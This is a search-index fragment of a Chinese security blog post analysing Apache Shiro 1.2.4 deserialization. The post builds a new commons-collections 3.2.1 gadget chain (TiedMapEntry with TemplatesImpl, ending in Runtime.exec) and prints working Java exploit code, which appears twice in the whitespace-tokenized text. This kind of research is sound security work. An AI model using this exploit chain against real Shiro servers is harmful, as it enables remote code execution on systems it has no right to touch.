  )   f2   .   get   (   innimpl   ) ;   Object   node   =   array   [   0   ]   ;   if   (   node   = =   null   ) {   node   =   array   [   1   ]   ;   }   Field   keyField   =   null   ;   try   {   keyField   =   node   .   getClass   ( ) .   getDeclaredField   (   \" key \"   ) ;   }   catch   (   Exception   e   ) {   keyField   =   Class   .   forName   (   \" java . util . MapEntry \"   ) .   getDeclaredField   (   \" key \"   ) ;   }   Reflections   .   setAccessible   (   keyField   ) ;   keyField   .   set   (   node   ,   entry   ) ;   / /   \u5c06 \u6700\u7ec8 \u7684 \u89e6\u53d1 \u51fd\u6570 newTransformer \u88c5\u8f7d \u5230 InvokerTransformer \u4e0a   Reflections   .   setFieldValue   (   transformer   ,   \" iMethodName \"   ,   \" newTransformer \"   ) ;   return   map   ;   \u8fd9\u91cc \u4e0d \u5bf9 \u6e90\u7801 \u8fdb\u884c \u8bb2\u89e3 \u4e86 \uff0c \u90fd \u5199 \u5728 \u4e86 \u6ce8\u91ca \u91cc \u3002   \u8fd9\u91cc \u6574\u7406 \u4e00\u4e0b \u8fd9\u6761 \u94fe \u7684 \u8c03\u7528 \u8fc7\u7a0b   java . util . HashSet . readObject ( )   - >   java . util . HashMap . put ( )   - >   java . util . HashMap . hash ( )   - >   org . apache . commons . collections . keyvalue . TiedMapEntry . hashCode ( )   - >   org . apache . commons . collections . keyvalue . TiedMapEntry . getValue ( )   - >   org . apache . commons . collections . map . LazyMap . get ( )   - >   org . apache . commons . collections . functors . InvokerTransformer . transform ( )   - >   java . lang . reflect . Method . invoke ( )   ...   templates   gadgets   ...   - >   java . lang . Runtime . exec ( )   0x05   \u603b\u7ed3   \u5728 \u7ecf\u8fc7 \u5bf9   CommonsCollections   \u7cfb\u5217 \u7684 \u5229\u7528 \u94fe \u8fdb\u884c \u5206\u6790 \u540e \uff0c \u5728 shiro \u8fd9\u4e2a \u95ee\u9898 \u4e0a \uff0c \u8fdb\u884c \u4e86 \u5b9e\u6218 \uff0c \u89e3\u51b3 \u4e86 tomcat \u4e0b \u65e0\u6cd5 \u5229\u7528 shiro \u539f\u751f \u7684   commons - collections : 3.2 . 1   \u8fd9\u4e2a \u95ee\u9898 \u3002   \u6700\u540e \uff0c \u5728 \u6700\u8fd1 \u7684   shiro - 721   \u5229\u7528 \u4e0a \uff0c \u8fd9\u4e2a \u5229\u7528 \u94fe \u5e0c\u671b \u53ef\u4ee5 \u5e2e\u52a9 \u5230 \u5927\u5bb6   Happy   Hacking   XD","title":"Java \u53cd \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \u4e4b Shiro \u53cd \u5e8f\u5217\u5316"},{"location":"blog/2019/study-java-deserialized-shiro-1-2-4-20191110/#0x00","text":"\u5728 \u8ddf \u4e86 \u4e00\u904d commons - collections \u7cfb\u5217 \u7684 payload \u540e \uff0c \u7ec8\u4e8e \u53ef\u4ee5 \u5f00\u59cb \u89e3\u51b3 \u4e00\u4e0b \u5f53\u65f6 \u5bf9 shiro \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6a21\u51cc \u4e24 \u53ef \u7684 \u8ba4\u8bc6 \u4e86 \u3002   \u5f53\u524d \uff0c \u4e0d\u7ba1 \u662f \u56fd\u5185 \u5b9e\u9645 \u7684 xx \u884c\u52a8 \u8fd8\u662f ctf \u6bd4\u8d5b \uff0c shiro \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u4f1a \u7ecf\u5e38 \u770b\u5230 \u3002 \u4f46 \u5728 \u5b9e\u9645 \u5229\u7528 \u8fd9\u4e2a \u6f0f\u6d1e \u7684 \u65f6\u5019 \uff0c \u4f1a \u53d1\u73b0 \u6211\u4eec \u65e0\u6cd5 \u5728 tomcat \u4e0b \u76f4\u63a5 \u5229\u7528 shiro - sample \u4e2d \u7684   commons - collections : 3.2 . 1   \uff08 2021 - 03 - 16 \u66f4\u65b0 \uff0c \u8fd9\u91cc \u7ecf p \u725b \u6307\u6b63 \uff0c shiro \u5e76 \u6ca1\u6709 \u4f9d\u8d56 cc \u5e93 \uff0c   \u8be6\u60c5   \uff09 \u3002   \u6211\u4eec \u524d\u9762 \u5df2\u7ecf \u5bf9 commons - collections \u7cfb\u5217 \u5229\u7528 \u94fe \u7684 \u5206\u6790 \uff0c \u4eca\u5929 \u5c31 \u6765 \u6839\u636e \u5b66\u5230 \u7684 \u77e5\u8bc6 \u6765 \u89e3\u51b3 \u8fd9\u4e2a \u95ee\u9898 \u3002   \u672c\u6587 \u8ba8\u8bba \u4e86 shiro - 1.2 . 4 \u7248\u672c \u65e0\u6cd5 \u76f4\u63a5 \u5229\u7528 \u73b0\u6709 \u7684 ysoserial \u5229\u7528 \u94fe \uff0c \u5e76 \u63d0\u51fa \u4e86 \u76f8\u5e94 \u7684 \u89e3\u51b3 \u65b9\u6848 \u89e3\u51b3\u65b9\u6848 \u3002","title":"0x00   \u524d\u8a00"},{"location":"blog/2019/study-java-deserialized-shiro-1-2-4-20191110/#0x01","text":"\u8fd9\u91cc \u7528 \u7684 \u662f   shiro - root - 1.2 . 4   \u7684 samples / web \u73af\u5883 \uff0c clone \u4e0b\u6765 \u540e \u6267\u884c   git   checkout   shiro - root - 1.2 . 4   \u5229\u7528 \u811a\u672c \u53c2\u8003 \u7684   \u77e5\u9053 \u521b\u5b87 \u7684 \u4e00\u7bc7 \u5206\u6790   ysoserial \u7528 \u7684 0.0 . 6 \u7248\u672c   https : / / github . com / frohoff / ysoserial   \u5148 \u6765\u8bb2 \u4e00\u4e0b \uff0c \u5173\u4e8e \u73af\u5883 \u65b9\u9762 \u9047\u5230 \u7684 \u5751 \uff1a   \u5728 \u90e8\u7f72 \u8fc7\u7a0b \u4e2d \uff0c \u9047\u5230 \u4e86   The   absolute   uri :   http : / / java . sun . com / jsp / jstl / core   cannot   be   resolved   in   either   web . xml   or   the   jar   files   deployed   with   this   application   \u7684 \u9519\u8bef   \u8fd9\u91cc \u7684 \u89e3\u51b3 \u65b9\u6848 \u89e3\u51b3\u65b9\u6848 \u662f \u4fee\u6539 pom . xml   \u200b   \u6dfb\u52a0 jstl \u7684 \u5177\u4f53 \u7248\u672c \u5373\u53ef \u89e3\u51b3 \u3002   serialVersionUID \u4e0d \u4e00\u81f4 \u5bfc\u81f4 \u65e0\u6cd5 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u95ee\u9898   \u8fd9\u91cc \u53ef\u80fd \u5728 \u4f60 \u7684 \u5b9e\u9a8c \u73af\u5883 \u4e0b \u4e0d \u4e00\u5b9a \u4f1a \u9047\u5230 \uff0c \u6211 \u7684 \u5b9e\u9a8c \u73af\u5883 \u548c ysoserial \u751f\u6210 \u7684 \u67d0 \u51e0\u4e2a \u7c7b \u7684 serialVersionUID \u4e0d \u4e00\u81f4 \uff0c \u5bfc\u81f4 \u65e0\u6cd5 \u6b63\u5e38 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u3002 \u5728 \u5b9e\u6218 \u4e2d \u4f60 \u53ef\u4ee5 \u91c7\u7528   \u8fd9 \u6587\u7ae0 \u7bc7\u6587\u7ae0   \u5904\u7406 \u65b9\u6cd5 \uff0c \u8fd9\u91cc \u6211 \u7684 \u89e3\u51b3 \u65b9\u6848 \u89e3\u51b3\u65b9\u6848 \u662f \u76f4\u63a5 \u540c\u6b65 \u4e2a   commons - collections : 3.2 . 1   \u7248\u672c \uff0c \u5728 \u751f\u6210 war \u5305\u524d \uff0c \u5728 pom . xml \u52a0\u5165   < dependency >   < groupId >   commons - collections   < / groupId >   < artifactId >   commons - collections   < / artifactId >   < version >   3.2 . 1   < / version >   < scope >   runtime   < / scope >   < / dependency >","title":"0x01   \u73af\u5883 \u51c6\u5907"},{"location":"blog/2019/study-java-deserialized-shiro-1-2-4-20191110/#0x02","text":"16 \u5e74 \u7684 \u65f6\u5019 \uff0c shiro \u7206\u51fa \u4e86 \u4e00\u4e2a \u9ed8\u8ba4 key \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u3002 \u81f3\u4eca \u5df2\u6709 \u81f3\u4eca\u5df2\u6709 \u5927\u91cf \u7684 \u5206\u6790 \u6587\u7ae0 \u5206\u6790 \u4e86 \u8be5 \u6f0f\u6d1e \u7684 \u539f\u7406 \uff0c \u6240\u4ee5 \u672c\u6587 \u4e0d\u518d \u91cd\u590d \u5206\u6790 \u8be5 \u6f0f\u6d1e \u7684 \u76f8\u5173 \u539f\u7406 \uff0c \u53ef\u4ee5 \u53c2\u8003 \u4ee5\u4e0b \u51e0\u7bc7 \u6587\u7ae0 \u7684 \u5206\u6790 \uff1a   1 . https : / / blog . knownsec . com / 2016 / 08 / apache - shiro - java /   2 . https : / / blog . zsxsoft . com / post / 35   3 . http : / / blog . orange . tw / 2018 / 03 / pwn - ctf - platform - with - java - jrmp - gadget . html   \u9664\u4e86 1 \u4e2d \u5728 \u6f0f\u6d1e \u73af\u5883 \u4e0b \u6dfb\u52a0 \u4e86   commons - collections : 4.0   \uff0c \u53e6\u5916 \u4e24\u7bc7 \u6587\u7ae0 \u5747 \u63d0\u5230 \u4e86 \u5728 tomcat \u4e0b \u65e0\u6cd5 \u76f4\u63a5 \u5229\u7528   commons - collections : 3.2 . 1   \u7684 \u95ee\u9898 \u3002 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u6211\u4eec \u5c31 \u6765 \u770b\u770b \u662f \u4ec0\u4e48 \u539f\u56e0 \u5427 \uff1a \uff09   org . apache . shiro . io . DefaultSerializer . deserialize : 67   \u8fd9\u91cc \u6211\u4eec \u76f4\u63a5 \u770b\u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u53d1\u751f \u7684 \u70b9 \uff0c \u7b2c 75 \u884c \u4f7f\u7528 \u4e86   ClassResolvingObjectInputStream   \u7c7b \u800c \u4f20\u7edf \u975e\u4f20\u7edf \u7684   ObjectInputStream   . \u8fd9\u91cc \u53ef\u80fd \u662f \u5f00\u53d1 \u53d1\u4eba \u4eba\u5458 \u5f00\u53d1\u4eba\u5458 \u505a \u7684 \u4e00\u79cd \u9632\u62a4 \u63aa\u65bd \uff1f \u4ed6 \u91cd\u5199 \u4e86   ObjectInputStream   \u7c7b \u7684   resolveClass   \u51fd\u6570 \uff0c \u6211 \u66fe \u5728 \u7b2c\u4e00 \u4e00\u7bc7 \u7b2c\u4e00\u7bc7   \u57fa\u7840 \u6587\u7ae0   \u4e2d \u5206\u6790 \u8fc7 Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u8fc7\u7a0b \uff0c   ObjectInputStream   \u7684   resolveClass   \u51fd\u6570 \u7528 \u7684 \u662f   Class . forName   \u7c7b \u83b7\u53d6 \u5f53\u524d \u63cf\u8ff0 \u5668 \u6240\u6307 \u4ee3 \u7684 \u7c7b \u7684 Class \u5bf9\u8c61 \u3002 \u800c \u91cd\u5199 \u540e \u7684   resolveClass   \u51fd\u6570   \u91c7\u7528 \u7684 \u662f   ClassUtils . forName   \uff0c \u6211\u4eec \u7ee7\u7eed \u770b \u8fd9\u4e2a forName \u7684 \u5b9e\u73b0 \u3002   \u6765 \u770b\u770b \u8fd9\u4e2a   ExceptionIgnoringAccessor   \u662f \u600e\u4e48 \u5b9e\u73b0 \u7684   \u8fd9\u91cc \u5b9e\u9645 \u5b9e\u9645\u4e0a \u8c03\u7528 \u4e86   ParallelWebAppClassLoader   \u7236\u7c7b   WebappClassLoaderBase   \u7684   loadClass   \u51fd\u6570 \uff08 \u53ef\u4ee5 \u76f4\u63a5 \u4e0b \u65ad\u70b9 \u770b\u770b \u5185\u5bb9 \uff09 \u3002   \u8be5 loadClass \u8f7d\u5165 \u6309\u7167 \u4e0a\u8ff0 \u7684 \u987a\u5e8f \uff08 \u8fd9\u91cc \u4e0d\u8d34 \u4ee3\u7801 \u4e86 \uff0c \u627e\u5230   org . apache . catalina . loader . WebappClassLoaderBase . loadClass   \u5373\u53ef \uff09 \uff0c \u5148 \u4ece cache \u4e2d \u627e \u5df2 \u8f7d\u5165 \u7684 \u7c7b \uff0c \u5982\u679c \u524d 3 \u70b9 \u90fd \u6ca1 \u627e\u5230 \uff0c \u518d \u901a\u8fc7 \u7236\u7c7b   URLClassLoader   \u7684   loadClass   \u51fd\u6570 \u8f7d\u5165 \u3002 \u4f46\u662f \u5b9e\u9645 \u5b9e\u9645\u4e0a \u6b64\u65f6 loadClass \u7684 \u53c2\u6570 name \u503c \u5e26\u4e0a \u4e86 \u6570\u7ec4 \u7684 \u6807\u5fd7 \uff0c \u5373   / Lorg / apache / commons / collections / Transformer ; . class   \uff0c \u5728 \u53c2\u8003 \u7684 \u7b2c\u4e8c \u4e8c\u7bc7 \u7b2c\u4e8c\u7bc7 \u6587\u7ae0 \u91cc \u6709 \u63d0\u5230 \u8fd9\u4e2a \u95ee\u9898 \uff0c \u6240\u4ee5 \u5bfc\u81f4 shiro \u65e0\u6cd5 \u8f7d\u5165 \u6570\u7ec4 \u7c7b\u578b \u7684 \u5bf9\u8c61 \u3002   \u90a3\u4e48 \u5982\u4f55 \u624d\u80fd \u771f\u6b63 \u7684 \u5229\u7528   commons - collections : 3.2 . 1   \u6765 \u6784\u9020 \u5229\u7528 \u94fe \u5462 \uff1f   \u9996\u5148 \uff0c \u5728 \u53c2\u8003 \u7684 \u7b2c\u4e00 \u4e00\u7bc7 \u7b2c\u4e00\u7bc7 \u6587\u7ae0 \u91cc \uff0c \u4f5c\u8005 \u5728 \u73af\u5883 \u4e2d \u5f15\u5165 \u4e86   commons - collections : 4.0   \uff0c \u4f7f\u5f97 ysoserial \u7684   CommonsCollections2   \u5229\u7528 \u94fe \u53ef\u4ee5 \u6210\u529f \u5229\u7528 \u3002 \u8fd9 \u56e0\u4e3a \u662f\u56e0\u4e3a   CommonsCollections2   \u7528 \u7684 \u662f\u975e \u6570\u7ec4 \u5f62\u5f0f \u7684 \u5229\u7528 \u94fe \uff0c \u5728 \u8be5 \u5229\u7528 \u94fe\u4e0a \u6ca1\u6709 \u51fa\u73b0 \u6570\u7ec4 \u7c7b\u578b \u7684 \u5bf9\u8c61 \uff0c \u8fd9 \u4f7f\u5f97 \u5728 shiro \u7684 \u73af\u5883 \u4e0b \uff0c \u53ef\u4ee5 \u6b63\u786e \u6267\u884c \u547d\u4ee4 \u6267\u884c\u547d\u4ee4 \u3002   \u90a3\u4e48 \uff0c \u95ee\u9898 \u6765 \u4e86 \uff0c \u6211\u4eec \u662f\u5426 \u80fd \u6784\u9020 \u51fa \u4e00\u4e2a \u5728   commons - collections : 3.2 . 1   \u4e0b \u53ef\u4ee5 \u5229\u7528 \uff0c \u5e76\u4e14 \u5728 \u5229\u7528 \u94fe\u4e0a \u4e0d \u5b58\u5728 \u6570\u7ec4 \u7c7b\u578b \u7684 \u5bf9\u8c61 \uff1f \u7b54\u6848 \u5f53\u7136 \u662f \u80af\u5b9a \u7684 \uff1a \uff09","title":"0x02   \u524d\u666f \u56de\u987e"},{"location":"blog/2019/study-java-deserialized-shiro-1-2-4-20191110/#0x03","text":"\u6839\u636e 0x02 \u7684 \u4ecb\u7ecd \uff0c \u6211\u4eec \u53ef\u4ee5 \u6e05\u695a \u7684 \u662f \u5229\u7528 \u94fe\u4e2d \u7684   ChainedTransformer   \u8fd9\u4e2a \u7c7b \u7684 \u5229\u7528 \u662f \u65e0\u6cd5 \u6210\u529f \u7684 \uff0c \u56e0\u4e3a \u4ed6 \u7684 \u7c7b \u5c5e\u6027   iTransformers   \u662f \u6570\u7ec4 \u7c7b\u578b \u7684   Transformers   \uff0c \u4e5f \u5c31\u662f \u5728 \u6267\u884c \u8fc7\u7a0b \u4e2d \u53d1\u751f \u7684   ClassNotFoundException   \u3002   \u5982\u679c \u4f60 \u770b\u8fc7 \u524d \u51e0\u7bc7 \u5173\u4e8e commons - collections \u7cfb\u5217 \u7684 payload \u5206\u6790 \uff0c \u90a3\u4e48 \u4f60 \u80af\u5b9a \u53ef\u4ee5 \u56de\u5fc6 \u8d77\u6765 \uff0c \u9664\u4e86 \u5229\u7528   ChainedTransformer   \u8fd9\u79cd \u65b9\u5f0f \uff0c \u8fd8 \u53ef\u4ee5 \u4f7f\u7528   TemplatesImpl . newTransformer   \u51fd\u6570 \u6765 \u52a8\u6001   loadClass   \u6784\u9020 \u597d \u7684 evil   class   bytes \uff08 \u8fd9 \u4e00\u90e8 \u90e8\u5206 \u4e00\u90e8\u5206 \u4e0d \u590d\u8ff0 \u4e86 \uff0c \u53ef\u4ee5 \u770b \u524d\u9762 \u7684 \u6587\u7ae0 \uff09 \u3002 \u5e76\u4e14 \u5728 \u8fd9\u90e8 \u90e8\u5206 \u8fd9\u90e8\u5206 \u5229\u7528 \u94fe\u4e0a \u662f \u4e0d \u5b58\u5728 \u6570\u7ec4 \u7c7b\u578b \u7684 \u5bf9\u8c61 \u7684 \u3002   \u90a3\u4e48 \uff0c \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u7684 \u91cd\u70b9 \u5c31\u662f \u627e \u4e00\u4e2a \u5982\u4f55 \u89e6\u53d1   TemplatesImpl . newTransformer   \u7684 \u65b9\u6cd5 \u4e86 \uff1a \uff09   \u6211\u4eec \u5148 \u6765 \u56de\u987e \u4e00\u4e0b   CommonsCollections2   \u7684 \u5229\u7528 \u94fe   PriorityQueue . readObject   - >   PriorityQueue . heapify ( )   - >   PriorityQueue . siftDown ( )   - >   PriorityQueue . siftDownUsingComparator ( )   - >   TransformingComparator . compare ( )   - >   InvokerTransformer . transform ( )   - >   TemplatesImpl . newTransformer ( )   ...   templates   Gadgets   ...   - >   Runtime . getRuntime ( ) . exec ( )   \u5728 \u8fd9 \u6761\u94fe \u4e0a \uff0c \u7531\u4e8e TransformingComparator \u5728 3.2 . 1 \u7684 \u7248\u672c \u4e0a \u8fd8 \u6ca1\u6709 \u5b9e\u73b0 Serializable \u63a5\u53e3 \uff0c \u5176 \u5728 3.2 . 1 \u7248\u672c \u4e0b \u662f \u65e0\u6cd5 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u3002 \u6240\u4ee5 \u6211\u4eec \u65e0\u6cd5 \u76f4\u63a5 \u5229\u7528 \u8be5 payload \u6765 \u8fbe\u5230 \u547d\u4ee4 \u6267\u884c \u7684 \u76ee\u7684 \u3002   \u90a3\u4e48 \u5c31 \u6765 \u6539\u9020 \u6539\u9020 \u5427 \uff01 \u6211\u4eec \u5148 \u5c06 \u6ce8\u610f \u6ce8\u610f\u529b \u5173\u6ce8 \u5728   InvokerTransformer . transform ( )   \u4e0a   \u8fd9\u91cc \u662f \u6700 \u7ecf\u5178 \u7684 \u53cd\u5c04 \u673a\u5236 \u7684 \u5199\u6cd5 \uff0c \u6839\u636e \u4f20\u5165 \u7684   input   \u5bf9\u8c61 \uff0c \u8c03\u7528 \u5176   iMethodName   \uff08 \u53ef\u63a7 \uff09 \u3002 \u90a3\u4e48 \u5982\u679c \u6b64\u65f6 \u4f20\u5165 \u7684   input   \u4e3a \u6784\u9020 \u597d \u7684   TemplatesImpl   \u5bf9\u8c61 \u5462 \uff1f   \u5f88 \u660e\u663e \uff0c \u8fd9\u6837 \u6211\u4eec \u5c31 \u53ef\u4ee5 \u901a\u8fc7 \u5c06   iMethodName   \u7f6e \u4e3a   newTransformer   \uff0c \u4ece\u800c \u5b8c\u6210 \u540e\u7eed \u7684 templates   gadgets \u3002   \u90a3\u4e48 \u95ee\u9898 \u6765 \u4e86 \uff0c \u600e\u4e48 \u5c06 \u4f20\u5165 \u7684   input   \u7f6e \u4e3a   TemplatesImpl   \u5bf9\u8c61 \u5462 \uff1f   \u5728 ysoserial \u7684 \u5229\u7528 \u94fe\u4e2d \uff0c \u5173\u4e8e   transform   \u51fd\u6570 \u63a5\u6536 \u7684   input   \u5b58\u5728 \u4e24\u79cd \u60c5\u51b5 \u3002","title":"0x03   \u65b0 \u5229\u7528 \u94fe \u6784\u9020"},{"location":"blog/2019/study-java-deserialized-shiro-1-2-4-20191110/#1chainedtransformer","text":"InvokerTransformer   \u5f80\u5f80 \u540c   ChainedTransformer   \u914d\u5408 \uff0c \u5faa\u73af \u6784\u9020 Runtimt . getRuntime ( ) . exec \u3002 \u5f88 \u660e\u663e \uff0c \u8fd9\u91cc \u6211\u4eec \u65e0\u6cd5 \u5229\u7528 \u4e86 \u3002","title":"1 . \u914d\u5408 ChainedTransformer"},{"location":"blog/2019/study-java-deserialized-shiro-1-2-4-20191110/#2string","text":"\u8fd9\u91cc \u7684 \u65e0 \u610f\u4e49 \u7684   String   \u6307 \u7684 \u662f \u4f20\u5165 \u5230   ConstantTransformer . transform   \u51fd\u6570 \u7684   input   \uff0c \u8be5   transform   \u51fd\u6570 \u4e0d \u4f9d\u8d56   input   \uff0c \u800c \u76f4\u63a5 \u8fd4\u56de   iConstant   \u8fd9\u91cc \u7b2c\u4e00 \u4e00\u6761 \u7b2c\u4e00\u6761 \u8def \u80af\u5b9a \u65ad \u4e86 \uff0c \u90a3\u4e48 \u5c31\u662f \u600e\u4e48 \u5229\u7528 \u8fd9\u4e2a \u65e0 \u610f\u4e49 \u7684   String   \u4e86 \uff01   \u4ece   CommonsCollection5   \u5f00\u59cb \uff0c \u51fa\u73b0 \u4e86   TiedMapEntry   \uff0c \u5176 \u4f5c\u4e3a \u4e2d\u7ee7 \uff0c \u8c03\u7528 \u4e86   LazyMap   \uff08 map \uff09 \u7684   get   \u51fd\u6570 \u3002   \u6765\u770b \u4e00\u770b   \u5176\u4e2d   map   \u548c   key   \u6211\u4eec \u90fd \u53ef\u4ee5 \u63a7\u5236 \uff0c \u800c   LazyMap . get   \u8c03\u7528 \u4e86   transform   \u51fd\u6570 \uff0c \u5e76 \u5c06 \u53ef\u63a7 \u7684   key   \u4f20\u5165   transform   \u51fd\u6570   \u8fd9\u91cc \u5c31 \u63a5\u4e0a \u4e86 \u6211\u4eec \u524d\u9762 \u8ba8\u8bba \u7684 \uff0c \u5c06 \u6784\u9020 \u597d \u7684   TemplatesImpl   \uff08 key \uff09 \u4f5c\u4e3a   InvokerTransformer . transform   \u51fd\u6570 \u7684   input   \u4f20\u5165 \uff0c \u6211\u4eec \u5c31 \u53ef\u4ee5 \u5c06 templates   gadgets \u4e32 \u8d77\u6765 \u4e86 \u3002   \u7b80\u5355 \u6765\u8bf4 \uff0c \u6211\u4eec \u5c06   CommonsCollections5 , 6 , 9   \u6784\u9020 \u94fe\u4e2d \u7684   TiedMapEntry   \u7684 key \u7528 \u4e86 \u8d77\u6765 \u3002   final   Object   templates   =   Gadgets   .   createTemplatesImpl   (   command   ) ;   / /   TiedMapEntry   entry   =   new   TiedMapEntry ( lazyMap ,   \" foo \" ) ;   / / \u539f\u6765 \u7684 \u5229\u7528 \u65b9\u5f0f   TiedMapEntry   entry   =   new   TiedMapEntry   (   lazyMap   ,   templates   ) ;   \u8fd9\u91cc \u5c06 \u65e0 \u610f\u4e49 \u7684   foo   \u6539\u9020 \u6210 \u4e86 \u89e6\u53d1   TemplatesImpl . newTransformer   \u7684 trigger \u3002   \u800c \u5728   TiedMapEntry   \u524d \u7684 \u5229\u7528 \u94fe \uff0c \u5728 \u539f\u751f shiro \u73af\u5883 \u4e0b \uff0c \u5e76 \u4e0d \u51b2\u7a81 \uff08 \u6ca1\u6709 \u6570\u7ec4 \u7c7b\u578b \u7684 \u5bf9\u8c61 \uff09 \uff0c \u53ef\u4ee5 \u6b63\u5e38 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u3002 \u8fd9 \u4e00\u90e8 \u90e8\u5206 \u4e00\u90e8\u5206 \u5c31 \u7701\u7565 \u4e86 \u3002","title":"2 . \u65e0 \u610f\u4e49 \u7684 String"},{"location":"blog/2019/study-java-deserialized-shiro-1-2-4-20191110/#20200108","text":"\u5176\u5b9e createTemplatesImpl \u7684 \u5229\u7528 \u65b9\u5f0f \u4e2d \u8fd8\u662f \u5b58\u5728 \u6570\u7ec4 \u5f62\u5f0f \u7684 \uff0c byte [ ] \u6570\u7ec4 \u7528\u4e8e \u5b58\u50a8 evil   class \u3002 \u4f46\u662f \u5728 tomcat   7 \u53ca \u4ee5\u4e0a \u7684 \u73af\u5883 \u4e0b \uff0c java \u7684 \u539f\u751f \u6570\u636e \u7c7b\u578b \u6570\u636e\u7c7b\u578b \u7684 \u6570\u7ec4 \u8fd8\u539f \u4e0d \u5f71\u54cd \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u53ea \u9488\u5bf9 \u5bf9\u8c61 \u7ea7\u522b \u7684 \u6570\u7ec4 \u8fd8\u539f \u3002 \u800c tomcat6 \u7684 \u5b9e\u73b0 \u65b9\u5f0f \u76f4\u63a5 \u4e0d \u5141\u8bb8 \u6570\u7ec4 \u7c7b\u578b \u7684 \u8fd8\u539f \uff0c \u5c31\u662f \u5c31\u662f\u8bf4 \u4e5f\u5c31\u662f\u8bf4 \u8be5 \u5229\u7528 \u94fe \u5728 tomcat6 \u7684 \u73af\u5883 \u4e0b \u662f \u6210\u529f \u4e0d\u4e86 \u7684 \u3002","title":"20200108 \u8865\u5145"},{"location":"blog/2019/study-java-deserialized-shiro-1-2-4-20191110/#20200109","text":"\u5f53 \u5e94\u7528 \u5f00\u542f \u4e86 security   manager \u65f6 \uff0c \u9700\u8981 \u8bbe\u7f6e   - Djdk . xml . enableTemplatesImplDeserialization = true","title":"20200109 \u8865\u5145"},{"location":"blog/2019/study-java-deserialized-shiro-1-2-4-20191110/#0x04-exp","text":"\u8fd9\u91cc \u5176\u5b9e \u53ef\u4ee5 \u6784\u9020 \u51fa \u597d\u51e0 \u51e0\u4e2a \u597d\u51e0\u4e2a \u94fe \uff0c \u6211 \u8fd9\u91cc \u5c31 \u62ff   HashSet   \u4e3a\u4f8b \uff0c \u5b8c\u6574 \u7684 exp \u89c1   MyYsoserial   \u4e2d \u7684   CommonsCollections10   final   Object   templates   =   Gadgets   .   createTemplatesImpl   (   command   ) ;   / /   \u6784\u9020 \u5e26\u6709 evil   class   bytes \u7684 TemplatesImpl   / /   \u6784\u9020 InvokerTransformer \uff0c \u586b\u5145 \u65e0\u5bb3 \u7684 toString \u51fd\u6570   final   InvokerTransformer   transformer   =   new   InvokerTransformer   (   \" toString \"   ,   new   Class   [   0   ]   ,   new   Object   [   0   ]   ) ;   final   Map   innerMap   =   new   HashMap   ( ) ;   / /   \u6784\u9020 LazyMap \u7684 factory \u4e3a \u524d\u9762 \u7684 InvokerTransformer   final   Map   lazyMap   =   LazyMap   .   decorate   (   innerMap   ,   transformer   ) ;   / /   \u586b\u5145 TiedMapEntry \u7684 map \uff08 lazyMap \uff09 \u548c key \uff08 TemplatesImpl \uff09   TiedMapEntry   entry   =   new   TiedMapEntry   (   lazyMap   ,   templates   ) ;   HashSet   map   =   new   HashSet   (   1   ) ;   map   .   add   (   \" foo \"   ) ;   / /   \u4e0b\u8ff0 \u4ee3\u7801 \u5c06 entry \u586b\u5145 \u5230 HashSet \u7684 node \u7684 key \u4e0a \uff0c \u53ef\u4ee5 \u4f7f\u5f97 HashSet \u5728 put \u7684 \u65f6\u5019 \u8c03\u7528 TiedMapEntry \u7684 hashCode \u51fd\u6570   Field   f   =   null   ;   try   {   f   =   HashSet   .   class   .   getDeclaredField   (   \" map \"   ) ;   }   catch   (   NoSuchFieldException   e   )   {   f   =   HashSet   .   class   .   getDeclaredField   (   \" backingMap \"   ) ;   }   Reflections   .   setAccessible   (   f   ) ;   HashMap   innimpl   =   null   ;   innimpl   =   (   HashMap   )   f   .   get   (   map   ) ;   Field   f2   =   null   ;   try   {   f2   =   HashMap   .   class   .   getDeclaredField   (   \" table \"   ) ;   }   catch   (   NoSuchFieldException   e   )   {   f2   =   HashMap   .   class   .   getDeclaredField   (   \" elementData \"   ) ;   }   Reflections   .   setAccessible   (   f2   ) ;   Object   [ ]   array   =   new   Object   [   0   ]   ;   array   =   (   Object   [ ]   )   f2   .   get   (   innimpl   ) ;   Object   node   =   array   [   0   ]   ;   if   (   node   = =   null   ) {   node   =   array   [   1   ]   ;   }   Field   keyField   =   null   ;   try   {   keyField   =   node   .   getClass   ( ) .   getDeclaredField   (   \" key \"   ) ;   }   catch   (   Exception   e   ) {   keyField   =   Class   .   forName   (   \" java . util . MapEntry \"   ) .   getDeclaredField   (   \" key \"   ) ;   }   Reflections   .   setAccessible   (   keyField   ) ;   keyField   .   set   (   node   ,   entry   ) ;   / /   \u5c06 \u6700\u7ec8 \u7684 \u89e6\u53d1 \u51fd\u6570 newTransformer \u88c5\u8f7d \u5230 InvokerTransformer \u4e0a   Reflections   .   setFieldValue   (   transformer   ,   \" iMethodName \"   ,   \" newTransformer \"   ) ;   return   map   ;   \u8fd9\u91cc \u4e0d \u5bf9 \u6e90\u7801 \u8fdb\u884c \u8bb2\u89e3 \u4e86 \uff0c \u90fd \u5199 \u5728 \u4e86 \u6ce8\u91ca \u91cc \u3002   \u8fd9\u91cc \u6574\u7406 \u4e00\u4e0b \u8fd9\u6761 \u94fe \u7684 \u8c03\u7528 \u8fc7\u7a0b   java . util . HashSet . readObject ( )   - >   java . util . HashMap . put ( )   - >   java . util . HashMap . hash ( )   - >   org . apache . commons . collections . keyvalue . TiedMapEntry . hashCode ( )   - >   org . apache . commons . collections . keyvalue . TiedMapEntry . getValue ( )   - >   org . apache . commons . collections . map . LazyMap . get ( )   - >   org . apache . commons . collections . functors . InvokerTransformer . transform ( )   - >   java . lang . reflect . Method . invoke ( )   ...   templates   gadgets   ...   - >   java . lang . Runtime . exec ( )","title":"0x04   EXP \u7f16\u5199"},{"location":"blog/2019/study-java-deserialized-shiro-1-2-4-20191110/#0x05","text":"\u5728 \u7ecf\u8fc7 